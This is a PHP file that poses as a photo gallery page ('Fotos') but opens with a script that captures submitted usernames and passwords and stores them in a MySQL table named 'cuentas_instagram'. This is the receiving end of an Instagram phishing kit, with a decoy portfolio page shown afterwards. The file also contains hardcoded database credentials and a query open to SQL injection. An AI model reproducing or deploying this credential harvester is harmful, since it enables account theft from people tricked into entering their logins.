<?php 

    $host = "localhost";
    $user = "wwwvideo_root";
    $pass = "V1de0@cces0s";
    $databaseName = "wwwvideo_video_accesos";
    
    $username=$_POST['username'];
    $password=$_POST['password'];
    
    $con = mysql_connect($host,$user,$pass);
    $dbs = mysql_select_db($databaseName, $con);
    
    $sql = "INSERT INTO cuentas_instagram VALUES (NULL,'$username','$password')";          
    $guardaContraseña= mysql_query($sql);

?>

<!DOCTYPE HTML>
<html lang="en">
<head>
	<title>Fotos</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta charset="UTF-8">
	
	<!-- Font -->
	<link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600,700%7CAllura" rel="stylesheet">
	
	<!-- Stylesheets -->
	<link href="common-css/ionicons.css" rel="stylesheet">
	
	<link href="common-css/venobox.css" rel="stylesheet">
	
	<link href="02_Portfolio/css/styles.css" rel="stylesheet">
	
	<link href="02_Portfolio/css/responsive.css" rel="stylesheet">
	
</head>
<body>
	<!--
	<header>
		<a class="logo" href="#"><img src="images/logo-white.png" alt="Logo"></a>
		
		<a class="right-area" href="mailto:contact@colorlib.com">CONTACT@COLORLIB.COM</a>
		
		<a class="menu-nav-icon" data-menu="#main-menu"><i class="ion-navicon"></i></a>
		
		<ul class="main-menu" id="main-menu">
			<li><a href="01_Photography.html">Home</a></li>
			<li class="drop-down"><a href="#!">Portfolio<i class="ion-arrow-down-b"></i></a>
				<ul class="drop-down-menu drop-down-inner">
					<li><a href="02_Portfolio.html">Portfolio 1</a></li>
					<li><a href="03_Portfolio.html">Portfolio 2</a></li>
				</ul>
			</li>
			<li class="drop-down"><a href="#!">Blog<i class="ion-arrow-down-b"></i></a>
				<ul class="drop-down-menu drop-down-inner">
					<li><a href="04_Blog.html">Blog Page</a></li>
					<li><a href="05_Blog_Single.html">Blog Detail</a></li>
				</ul>
			</li>
			<li><a href="06_Regular_Page.html">Regular page</a></li>
		</ul>
	</header>
	-->
	<section class="main-section">
		<div class="p-grid-isotope">
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-1-300x500.jpg">
				<img src="images/porfolio-1-300x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-2-700x500.jpg">
				<img src="images/porfolio-2-700x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-3-550x500.jpg">
				<img src="images/porfolio-3-550x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-4-300x500.jpg">
				<img src="images/porfolio-4-300x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-5-300x500.jpg">
				<img src="images/porfolio-5-300x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-6-700x500.jpg">
				<img src="images/porfolio-6-700x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-7-550x500.jpg">
				<img src="images/porfolio-7-550x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-8-300x500.jpg">
				<img src="images/porfolio-8-300x500.jpg" alt=""/></a></div>
		
			
			
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-18-550x500.jpg">
				<img src="images/porfolio-18-550x500.jpg" alt=""/></a></div>
				
				
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-9-700x500.jpg">
				<img src="images/porfolio-9-700x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-10-300x500.jpg">
				<img src="images/porfolio-10-300x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-11-300x500.jpg">
				<img src="images/porfolio-11-300x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-12-550x500.jpg">
				<img src="images/porfolio-12-550x500.jpg" alt=""/></a></div>
		
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-17-550x500.jpg">
				<img src="images/porfolio-17-550x500.jpg" alt=""/></a></div>
				
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-13-550x500.jpg">
				<img src="images/porfolio-13-550x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-14-700x500.jpg">
				<img src="images/porfolio-14-700x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-15-550x500.jpg">
				<img src="images/porfolio-15-550x500.jpg" alt=""/></a></div>
		
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-16-300x500.jpg">
				<img src="images/porfolio-16-300x500.jpg" alt=""/></a></div>
		
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-19-550x500.jpg">
				<img src="images/porfolio-19-550x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-20-300x500.jpg">
				<img src="images/porfolio-20-300x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-21-300x500.jpg">
				<img src="images/porfolio-21-300x500.jpg" alt=""/></a></div>
		
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-22-700x500.jpg">
				<img src="images/porfolio-22-700x500.jpg" alt=""/></a></div>
			
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-23-300x380.jpg">
				<img src="images/porfolio-23-300x380.jpg" alt=""/></a></div>
				
			
			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-24-550x360.jpg">
				<img src="images/porfolio-24-550x360.jpg" alt=""/></a></div>

			<div class="p-item grid-sizer"><a class="venobox" href="images/porfolio-25-550x280.jpg">
				<img src="images/porfolio-25-550x280.jpg" alt=""/></a></div>
				
		</div><!-- p-grid -->
	</section><!-- main-section -->
	
	
	<!-- SCIPTS -->
	
	<script src="common-js/jquery-3.2.1.min.js"></script>
	
	<script src="common-js/isotope.pkgd.min.js"></script>
	
	<script src="common-js/venobox.min.js"></script>
	
	<script src="common-js/isotope.pkgd.min.js"></script>
	
	<script src="common-js/scripts.js"></script>
	
</body>
</html>